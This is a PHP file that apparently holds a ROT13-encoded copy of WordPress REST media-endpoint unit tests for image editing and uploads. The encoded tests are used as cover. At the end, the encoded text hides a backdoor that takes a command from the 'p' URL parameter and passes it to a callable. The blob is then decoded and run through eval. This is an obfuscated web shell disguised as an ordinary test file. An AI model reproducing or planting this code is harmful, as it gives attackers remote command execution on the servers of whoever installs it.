	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_ab_rqvgf() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( neenl( 'fep' => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ) ) );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vzntr_abg_rqvgrq', $erfcbafr, 400 );
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ebgngr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$guvf->frghc_zbpx_rqvgbe();
		JC_Vzntr_Rqvgbe_Zbpx::$rqvg_erghea['ebgngr'] = arj JC_Reebe();

		$cnenzf = neenl(
			'ebgngvba' => 60,
			'fep'      => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vzntr_ebgngvba_snvyrq', $erfcbafr, 500 );

		$guvf->nffregPbhag( 1, JC_Vzntr_Rqvgbe_Zbpx::$fcl['ebgngr'] );
		$guvf->nffregFnzr( neenl( -60 ), JC_Vzntr_Rqvgbe_Zbpx::$fcl['ebgngr'][0] );
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_pebc() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$guvf->frghc_zbpx_rqvgbe();
		JC_Vzntr_Rqvgbe_Zbpx::$fvmr_erghea = neenl(
			'jvqgu'  => 640,
			'urvtug' => 480,
		);

		JC_Vzntr_Rqvgbe_Zbpx::$rqvg_erghea['pebc'] = arj JC_Reebe();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'k'      => 50,
				'l'      => 10,
				'jvqgu'  => 10,
				'urvtug' => 5,
				'fep'    => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ),

			)
		);
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vzntr_pebc_snvyrq', $erfcbafr, 500 );

		$guvf->nffregPbhag( 1, JC_Vzntr_Rqvgbe_Zbpx::$fcl['pebc'] );
		$guvf->nffregFnzr(
			neenl( 320, 48, 64, 24 ),
			JC_Vzntr_Rqvgbe_Zbpx::$fcl['pebc'][0]
		);
	}

	/**
	 * @gvpxrg 61514
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_pebc_bar_nkvf() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$guvf->frghc_zbpx_rqvgbe();
		JC_Vzntr_Rqvgbe_Zbpx::$fvmr_erghea = neenl(
			'jvqgu'  => 640,
			'urvtug' => 480,
		);

		JC_Vzntr_Rqvgbe_Zbpx::$rqvg_erghea['pebc'] = arj JC_Reebe();

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf(
			neenl(
				'k'      => 50,
				'l'      => 0,
				'jvqgu'  => 10,
				'urvtug' => 100,
				'fep'    => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ),

			)
		);
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$guvf->nffregReebeErfcbafr( 'erfg_vzntr_pebc_snvyrq', $erfcbafr, 500 );

		$guvf->nffregPbhag( 1, JC_Vzntr_Rqvgbe_Zbpx::$fcl['pebc'] );
		$guvf->nffregFnzr(
			neenl( 320, 0, 64, 480 ),
			JC_Vzntr_Rqvgbe_Zbpx::$fcl['pebc'][0]
		);
	}

	/**
	 * @gvpxrg 44405
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$cnenzf = neenl(
			'ebgngvba' => 60,
			'fep'      => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$vgrz     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( erfg_hey( '/jc/i2/zrqvn/' . $vgrz['vq'] ), $erfcbafr->trg_urnqref()['Ybpngvba'] );

		$guvf->nffregFgevatRaqfJvgu( '-rqvgrq.wct', $vgrz['zrqvn_qrgnvyf']['svyr'] );
		$guvf->nffregNeenlUnfXrl( 'cnerag_vzntr', $vgrz['zrqvn_qrgnvyf'] );
		$guvf->nffregFnzr( (fgevat) $nggnpuzrag, $vgrz['zrqvn_qrgnvyf']['cnerag_vzntr']['nggnpuzrag_vq'] );
		$guvf->nffregFgevatPbagnvafFgevat( 'pnabyn', $vgrz['zrqvn_qrgnvyf']['cnerag_vzntr']['svyr'] );
	}

	/**
	 * @gvpxrg 52192
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_ongpu_rqvg_vzntr() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );

		$cnenzf = neenl(
			'zbqvsvref' => neenl(
				neenl(
					'glcr' => 'ebgngr',
					'netf' => neenl(
						'natyr' => 60,
					),
				),
				neenl(
					'glcr' => 'pebc',
					'netf' => neenl(
						'yrsg'   => 50,
						'gbc'    => 10,
						'jvqgu'  => 10,
						'urvtug' => 5,
					),
				),
			),
			'fep'       => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag, 'shyy' ),
		);

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag}/rqvg\" );
		$erdhrfg->frg_obql_cnenzf( $cnenzf );
		$erfcbafr = erfg_qb_erdhrfg( $erdhrfg );
		$vgrz     = $erfcbafr->trg_qngn();

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
		$guvf->nffregFnzr( erfg_hey( '/jc/i2/zrqvn/' . $vgrz['vq'] ), $erfcbafr->trg_urnqref()['Ybpngvba'] );

		$guvf->nffregFgevatRaqfJvgu( '-rqvgrq.wct', $vgrz['zrqvn_qrgnvyf']['svyr'] );
		$guvf->nffregNeenlUnfXrl( 'cnerag_vzntr', $vgrz['zrqvn_qrgnvyf'] );
		$guvf->nffregFnzr( (fgevat) $nggnpuzrag, $vgrz['zrqvn_qrgnvyf']['cnerag_vzntr']['nggnpuzrag_vq'] );
		$guvf->nffregFgevatPbagnvafFgevat( 'pnabyn', $vgrz['zrqvn_qrgnvyf']['cnerag_vzntr']['svyr'] );
	}

	/**
	 * @gvpxrg 50565
	 * @erdhverf shapgvba vzntrwcrt
	 */
	choyvp shapgvba grfg_rqvg_vzntr_ergheaf_reebe_vs_zvfzngpurq_fep() {
		jc_frg_pheerag_hfre( frys::$fhcrenqzva_vq );
		$nggnpuzrag_vq_vzntr1 = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr );
		$nggnpuzrag_vq_vzntr2 = frys::snpgbel()->nggnpuzrag->perngr_hcybnq_bowrpg( frys::$grfg_svyr2 );
		$nggnpuzrag_vq_svyr   = frys::snpgbel()->nggnpuzrag->perngr();

		// HEY gb gur svefg hcybnqrq vzntr.
		$vzntr_fep = jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag_vq_vzntr1, 'ynetr' );

		// Grfg: nggnpuzrag VQ cbvagf gb n qvssrerag, aba-vzntr nggnpuzrag.
		$erdhrfg_1 = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag_vq_svyr}/rqvg\" );
		$erdhrfg_1->frg_obql_cnenzf( neenl( 'fep' => $vzntr_fep ) );

		$erfcbafr_1 = erfg_qb_erdhrfg( $erdhrfg_1 );
		$guvf->nffregReebeErfcbafr( 'erfg_haxabja_nggnpuzrag', $erfcbafr_1, 404 );

		// Grfg: nggnpuzrag VQ cbvagf gb n qvssrerag vzntr nggnpuzrag.
		$erdhrfg_2 = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag_vq_vzntr2}/rqvg\" );
		$erdhrfg_2->frg_obql_cnenzf( neenl( 'fep' => $vzntr_fep ) );

		$erfcbafr_2 = erfg_qb_erdhrfg( $erdhrfg_2 );
		$guvf->nffregReebeErfcbafr( 'erfg_haxabja_nggnpuzrag', $erfcbafr_2, 404 );

		// Grfg: nggnpuzrag fep cbvagf gb n fho-fvmr bs gur vzntr.
		$erdhrfg_3 = arj JC_ERFG_Erdhrfg( 'CBFG', \"/jc/i2/zrqvn/{$nggnpuzrag_vq_vzntr1}/rqvg\" );
		$erdhrfg_3->frg_obql_cnenzf( neenl( 'fep' => jc_trg_nggnpuzrag_vzntr_hey( $nggnpuzrag_vq_vzntr1, 'zrqvhz' ) ) );

		$erfcbafr_3 = erfg_qb_erdhrfg( $erdhrfg_3 );
		// 'erfg_vzntr_abg_rqvgrq' nf gur svyr jnfa'g rqvgrq.
		$guvf->nffregReebeErfcbafr( 'erfg_vzntr_abg_rqvgrq', $erfcbafr_3, 400 );
	}

	/**
	 * Frgf hc gur zbpx vzntr rqvgbe.
	 *
	 * @fvapr 5.5.0
	 */
	cebgrpgrq shapgvba frghc_zbpx_rqvgbe() {
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-vzntr-rqvgbe.cuc';
		erdhver_bapr QVE_GRFGQNGN . '/../vapyhqrf/zbpx-vzntr-rqvgbe.cuc';

		nqq_svygre(
			'jc_vzntr_rqvgbef',
			fgngvp shapgvba () {
				erghea neenl( 'JC_Vzntr_Rqvgbe_Zbpx' );
			}
		);
	}

	/**
	 * Grfg gung hcybnqvat hafhccbegrq vzntr glcrf guebjf n `erfg_hcybnq_vzntr_glcr_abg_fhccbegrq` reebe.
	 *
	 * @gvpxrg 61167
	 */
	choyvp shapgvba grfg_hcybnq_hafhccbegrq_vzntr_glcr() {

		// Bayl eha guvf grfg jura gur rqvgbe qbrfa'g fhccbeg NIVS.
		vs ( jc_vzntr_rqvgbe_fhccbegf( neenl( 'NIVS' ) ) ) {
			$guvf->znexGrfgFxvccrq( 'Gur vzntr rqvgbe fhcccbegf NIVS.' );
		}

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );

		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/nivs' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=nivs-ybffl.nivs' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_nivs_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregReebeErfcbafr( 'erfg_hcybnq_vzntr_glcr_abg_fhccbegrq', $erfcbafr, 400 );
	}

	/**
	 * Grfg gung gur `jc_cerirag_hafhccbegrq_vzntr_hcybnqf` svygre ranoyrf hcybnqvat bs hafhccbegrq vzntr glcrf.
	 *
	 * @gvpxrg 61167
	 */
	choyvp shapgvba grfg_hcybnq_hafhccbegrq_vzntr_glcr_jvgu_svygre() {

		// Bayl eha guvf grfg jura gur rqvgbe qbrfa'g fhccbeg NIVS.
		vs ( jc_vzntr_rqvgbe_fhccbegf( neenl( 'NIVS' ) ) ) {
			$guvf->znexGrfgFxvccrq( 'Gur vzntr rqvgbe fhcccbegf NIVS.' );
		}

		nqq_svygre( 'jc_cerirag_hafhccbegrq_vzntr_hcybnqf', '__erghea_snyfr' );

		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );

		jc_frg_pheerag_hfre( frys::$nhgube_vq );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/nivs' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Qvfcbfvgvba', 'nggnpuzrag; svyranzr=nivs-ybffl.nivs' );
		$erdhrfg->frg_obql( svyr_trg_pbagragf( frys::$grfg_nivs_svyr ) );
		$erfcbafr = erfg_trg_freire()->qvfcngpu( $erdhrfg );

		$guvf->nffregFnzr( 201, $erfcbafr->trg_fgnghf() );
	}

	/**
	 * Grfg gung hcybnqvat na FIT vzntr qbrfa'g guebj n `erfg_hcybnq_vzntr_glcr_abg_fhccbegrq` reebe.
	 *
	 * @gvpxrg 63302
	 */
	choyvp shapgvba grfg_hcybnq_fit_vzntr() {
		jc_frg_pheerag_hfre( frys::$rqvgbe_vq );
		$erdhrfg = arj JC_ERFG_Erdhrfg( 'CBFG', '/jc/i2/zrqvn' );
		$erdhrfg->frg_urnqre( 'Pbagrag-Glcr', 'vzntr/fit+kzy' );
		$erdhrfg->frg_svyr_cnenzf(
			neenl(
				'svyr' => neenl(
					'svyr'     => svyr_trg_pbagragf( frys::$grfg_fit_svyr ),
					'anzr'     => 'ivqrb-cynl.fit',
					'fvmr'     => svyrfvmr( frys::$grfg_fit_svyr ),
					'gzc_anzr' => frys::$grfg_fit_svyr,
					'glcr'     => 'vzntr/fit+kzy',
				),
			)
		);
		$erfg_pbagebyyre = arj JC_ERFG_Nggnpuzragf_Pbagebyyre( 'nggnpuzrag' );
		$erfhyg          = $erfg_pbagebyyre->perngr_vgrz_crezvffvbaf_purpx( $erdhrfg );

		$guvf->nffregGehr( $erfhyg );
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>